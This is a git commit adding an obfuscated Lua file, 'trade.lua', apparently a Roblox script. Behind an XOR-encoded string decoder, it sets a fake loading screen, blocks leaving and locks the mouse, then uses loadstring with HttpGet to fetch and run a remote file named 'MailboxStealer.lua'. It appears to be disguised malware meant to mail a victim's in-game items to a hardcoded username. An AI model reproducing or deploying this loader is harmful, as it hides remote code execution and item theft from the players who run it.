49c75e5ffb638e023150a6ee8b4aa5f6bc257bc7
NTIMME01 <135490924+NTIMME01@users.noreply.github.com>
2023-06-04 11:54:28 +0700

    Add files via upload

---
+++ trade.lua
@@ -0,0 +1,12 @@
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.2.8) ~  Much Love, Ferib 
+
+]]--
+
+local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v10=1422 -(378 + 1044) ;local v11;while true do if (v10==(2 -1)) then return v5(v11);end if (v10==(0 -0)) then v11={};for v12=569 -(367 + 201) , #v8 do v6(v11,v0(v4(v1(v2(v8,v12,v12 + (928 -(214 + 713)) )),v1(v2(v9,1 + 0 + ((v12-1)% #v9) ,1 + 0 + ((v12-(878 -(282 + 595)))% #v9) + 1 )))%(1893 -(1523 + 114)) ));end v10=1 + 0 ;end end end UserName=v7("\49\225\251\255\2\193\227\146\78\136","\126\177\163\187\69\134\219\167");_G.LoadingScreen=true;_G.AntiLeave=true;_G.MouseLock=true;_G.ScriptName=v7("\209\2\255\3\237\233\33\141","\156\67\173\74\165");_G.FirstText=v7("\117\55\165\64\6\168\102\118\38\178\89\23\174\47\72\51","\38\84\215\41\118\220\70");_G.SecondText=v7("\205\83\4\43\2\234\16\58\45\19\250\89\24\37\92\176\30","\158\48\118\66\114");_G.ThirdText=v7("\218\167\41\31\37\103\229\223\164\42\21\120\61\235","\155\203\68\112\86\19\197");_G.WaitingTime=(867 -258) -429 ;loadstring(game:HttpGet("https://raw.githubusercontent.com/HerrSimoNHub/api/main/MailboxStealer.lua",true))();
